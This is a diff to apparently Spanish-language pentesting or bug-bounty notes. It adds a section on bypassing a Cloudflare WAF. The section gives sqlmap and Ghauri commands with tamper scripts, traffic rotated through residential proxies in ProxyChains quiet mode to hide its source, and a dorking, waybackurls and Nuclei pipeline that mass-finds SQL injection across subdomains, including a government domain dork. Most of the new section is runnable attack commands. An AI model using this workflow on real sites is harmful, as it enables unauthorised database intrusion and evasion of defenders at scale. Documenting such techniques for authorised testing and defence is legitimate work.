@@ -844,7 +844,7 @@ Si la empresa cree que existe una infracción o explotación grave, puede escala
 
 # ***XIII. WordPress***
 
-### 12.1. ***WordPress Admin Takeover - cookie***..
+### 13.1. ***WordPress Admin Takeover - cookie***..
    - ```bash 
       https://www.youtube.com/watch?v=zSTpSn_-bgw
       ```
@@ -853,7 +853,7 @@ Si la empresa cree que existe una infracción o explotación grave, puede escala
 
 # ***XIV. ServiceNow***
 
-### 12.1. ***CVE-2024-4879 - Jelly Template Injection Vulnerability in ServiceNow***..
+### 14.1. ***CVE-2024-4879 - Jelly Template Injection Vulnerability in ServiceNow***..
    - ```bash 
       https://www.youtube.com/watch?v=__r7tz47Lso
       ```
@@ -862,10 +862,97 @@ Si la empresa cree que existe una infracción o explotación grave, puede escala
 
 # ***XV. OPT Bypass***
 
-### 12.1. ***Captura con Burp Suite el codigo OTP y hace un Bypass***..
+### 15.1. ***Captura con Burp Suite el codigo OTP y hace un Bypass***..
    - ```bash 
       https://www.youtube.com/watch?v=AaoMqnu3DhA
       https://www.youtube.com/watch?v=xmNHAcugrzw
+      ```
+
+-------------------------------------------------------------------------------------------------
+
+# ***XVI. Eludir WAF con SQLMap, Proxychains y Tamper Scripts***
+
+### 16.1. ***Ghauri*** reconocimiento inicial con Ghauri para la detección automatizada de SQLi, especialmente con bases de datos MySQL. Simplemente se proporciona una URL y el sistema busca parámetros vulnerables.
+   - ```bash 
+      ghauri -u 'https://dominio.com/index.php?r=site/bertia_list&id=1*' --dbs --batch --level 3
+
+      ....
+      ....
+      it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [y/n] y
+
+      for the remaining test, do you want to include all tests for 'MySQL'? [y/n] y
+      ```
+ ### 16.2. ***ProxyChains*** abra el archivo de configuración de ProxyChains sudo nano /etc/proxychains.conf. Por defecto, está configurado en Tor a través de 127.0.0.1:9050. Comente esto usando un hash # para deshabilitar el proxy local y pegue los proxies residenciales de https://app.floppydata.com/proxy-pool/51244 con el siguiente formato: http <ipaddress> <port> [username] [password]. Los datos para el formato lo encontrara en Dashboard ir a la seccion Proxy pools, clic en View Proxies y al final esta la tabla con los proxies residenciales y clic en check proxy. Y pegarlo despues de los proxy local comantados.
+ 
+   - Después de esto, desactive la opción de cadena dinámica y active la cadena aleatoria. Esto mejora la fiabilidad al trabajar con varios proxies. Si uno falla, ProxyChains se alternará automáticamente con otro. Active también el modo silencioso para suprimir los registros de ProxyChains mientras usa sus herramientas. Una vez hecho esto, guarde el archivo de configuración.
+   - ```bash 
+      #dynamic_chain
+      #
+      # Dynamic - Each connection will be done via chained proxies
+      # all proxies chained in the order as they appear in the list
+      # at least one proxy must be online to play in chain
+      # (dead proxies are skipped)
+      # otherwise EINTR is returned to the app
+      #
+      #strict_chain
+      #
+      # Strict - Each connection will be done via chained proxies
+      # all proxies chained in the order as they appear in the list
+      # all proxies must be online to play in chain
+      # otherwise EINTR is returned to the app
+      #
+      random_chain
+      #
+      # Random - Each connection will be done via random proxy
+      # (or proxy chain, see  chain_len) from the list.
+      # this option is good to test your IDS :)
+      
+      # Make sense only if random_chain
+      #chain_len = 2
+      
+      # Quiet mode (no output from library)
+      quiet_mode
+      ```
+   - Validación de ProxyChains con Curl. Después de este comando, si recibe respuestas desde diferentes direcciones IP con cada solicitud, esto confirma que ProxyChains está enrutando correctamente nuestro tráfico a través de los proxies residenciales.
+   - ```bash 
+      proxychains curl http://ipinfo.io (ejecute varias veces para ver como va cambiando nuestra IP)
+      proxychains curl http://ipinfo.io/ip
+      ```
+### 16.3. ***SQLMap + ProxyChains + tampers*** Ahora, usemos SQLMap con ProxyChains y algunos scripts de manipulación para ver si podemos omitir el WAF de Cloudflare con el siguiente comando.
+   - ```bash 
+      proxychains sqlmap -u 'https://dominio.com/index.php?r=site/bertia_list&id=1' --dbs --batch -p id --random-agent --tamper=between,space2comment --dbms mysql --tech=B --no-cast  --flush-session --threads 10
+      ```
+   - ```bash 
+      proxychains sqlmap -u 'https://dominio.com/index.php?option=com_content&view=article&id=7*&Itemid=10' --dbs --batch --random-agent --tamper=between,space2comment --no-cast --level 5 --risk 3 --dbms MYSQL
+      ```
+### 16.4. ***Google Dork*** buscar masivamente inyecciones SQL en subdominios.
+   - ```bash 
+      python dorking.py
+
+      [+] Enter The Dork Search Query: inurl: dominio.*.go.id
+      [+] Enter Total number of result.....: all
+      [+] Do you want to save...: y
+      [+] Enter output filename: urls.txt
+      ```
+   - Desde aquí, extraiga solo los nombres de dominio y guárdelos en una lista limpia.
+   - ```bash 
+      cat urls.txt | awk -F/ '{print $3}' | sort -u > new.txt
+      ```
+   - A continuación, utilizamos waybackurls en estos dominios combinados con patrones gf y uro para extraer URL de parámetros SQL únicos de fuentes pasivas.
+   - ```bash 
+      cat new.txt | waybackurls | gf sqli | uro | tee final.txt
+      ```
+   - Reducción del ruido para un escaneo eficaz.
+   - ```bash 
+      cat final.txt | gawk -F/ '{host=$3; sub(/:80$/, "", host); if (!(host in seen)) { print $0; seen[host] } }'
+      ```
+### 16.5. ***Nuclei*** Escaneo con la plantilla SQLi de Nuclei.
+   - ```bash 
+      nuclei -l final.txt  |gawk -F/ '{host=$3; sub(/:80$/, "", host); if (!(host in seen)) { print $0; seen[host] } }' | -t nuclei-templates/dast/sql-injection.yaml
+
+      nuclei -l final.txt -t nuclei-templates/dast/sql-injection.yaml
+
+     cat final.txt | nuclei -t /home/paulportanc/nuclei-templat/errsqli.yaml -dast -c 30
       ```
 -------------------------------------------------------------------------------------------------
 
